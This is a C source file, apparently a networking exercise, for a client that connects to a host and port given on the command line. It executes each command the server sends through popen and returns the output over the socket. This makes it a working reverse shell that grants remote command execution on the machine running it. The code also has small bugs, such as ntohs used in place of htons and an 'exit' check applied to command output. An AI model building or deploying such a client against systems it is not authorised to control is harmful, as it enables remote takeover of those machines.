#include "syscalls.h"
#define MAXLINE 4096

void validate_input(int argc, char **argv, char error[])
{
  if (argc != 3)
  {
    strcpy(error, "usage: ");
    strcat(error, argv[0]);
    strcat(error, " <IPaddress>");
    strcat(error, " <#Port>");
    perror(error);
    exit(1);
  }
}

void send_command_result(char *command, int sockfd)
{
  // Executes the command
  FILE *outputfd = NULL;
  outputfd = popen(command, "r");
  if (outputfd == NULL)
  {
    perror("faild to run command");
    exit(1);
  }
  // Writes to the server
  char line[MAXLINE];
  char temp[MAXLINE];
  while (fgets(line, MAXLINE, outputfd) != NULL)
  {
    strcpy(temp, line);
    if (!strcmp(temp, "exit"))
    {
      write(sockfd, NULL, 0);
      exit(0);
    }
    // TODO: delete
    fputs(temp, stdout);
    write(sockfd, line, strlen(line));
  }
}

/* Connect to the server and listen to it's request
 * Execute command
 * Send the result back to the server
 */
int main(int argc, char **argv)
{
  int sockfd, n;
  char recvline[MAXLINE + 1];
  char error[MAXLINE + 1];
  struct sockaddr_in servaddr;

  // Input validation
  validate_input(argc, argv, error);

  // Create an internet IPV4 socket
  sockfd = Socket(AF_INET, SOCK_STREAM, 0);
  bzero(&servaddr, sizeof(servaddr));
  servaddr.sin_family = AF_INET;
  servaddr.sin_port = ntohs((atoi(argv[2])));

  // Converts the IP address from host format to network format
  if (inet_pton(AF_INET, argv[1], &servaddr.sin_addr) <= 0)
  {
    perror("inet_pton error");
    exit(1);
  }

  // Connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));
  if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
  {
    perror("connect error");
    exit(1);
  }

  // Get and print information about the local socket
  struct sockaddr_in server_socket;
  int server_socket_length = sizeof(servaddr);
  getsockname(sockfd, (sockaddr *)&server_socket, (socklen_t *)&server_socket_length);
  char buffer[INET_ADDRSTRLEN];
  const char *printable_addr = inet_ntop(AF_INET, &server_socket.sin_addr,
                                         buffer, INET_ADDRSTRLEN);
  printf("Local IP Address: %s\n", printable_addr);
  printf("Local Port: %d\n", server_socket.sin_port);

  // Wait for the command
  while ((n = read(sockfd, recvline, MAXLINE)) > 0)
  {
    recvline[n] = 0;
    // TODO: delete the print
    fputs("[command] ", stdout);
    if (fputs(recvline, stdout) == EOF)
    {
      perror("fputs error");
      exit(1);
    }

    // Send the command result back to the server
    if (n > 0 && recvline[n - 1] == '\n')
    {
      send_command_result(recvline, sockfd);
    }
  }

  return 0;
}
